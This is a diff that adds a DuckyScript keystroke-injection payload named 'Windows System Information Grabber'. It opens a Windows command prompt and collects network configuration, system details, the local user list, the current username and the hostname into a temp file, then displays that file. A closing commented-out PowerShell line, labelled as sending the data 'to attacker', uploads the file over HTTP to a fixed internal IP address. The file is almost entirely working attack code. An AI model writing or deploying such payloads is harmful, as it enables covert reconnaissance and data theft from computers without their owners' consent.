@@ -1,0 +1,29 @@
+REM Windows System Information Grabber
+REM Opens Command Prompt and gathers system info
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING ipconfig /all > %temp%\sysinfo.txt
+ENTER
+DELAY 500
+STRING systeminfo >> %temp%\sysinfo.txt
+ENTER
+DELAY 500
+STRING net user >> %temp%\sysinfo.txt
+ENTER
+DELAY 500
+STRING whoami >> %temp%\sysinfo.txt
+ENTER
+DELAY 500
+STRING hostname >> %temp%\sysinfo.txt
+ENTER
+DELAY 500
+STRING notepad %temp%\sysinfo.txt
+ENTER
+DELAY 2000
+REM Send to attacker via HTTP (requires web server)
+REM STRING powershell -Command "Invoke-WebRequest -Uri http://192.168.1.100:8000/upload -Method POST -InFile %temp%\sysinfo.txt"
+REM ENTER
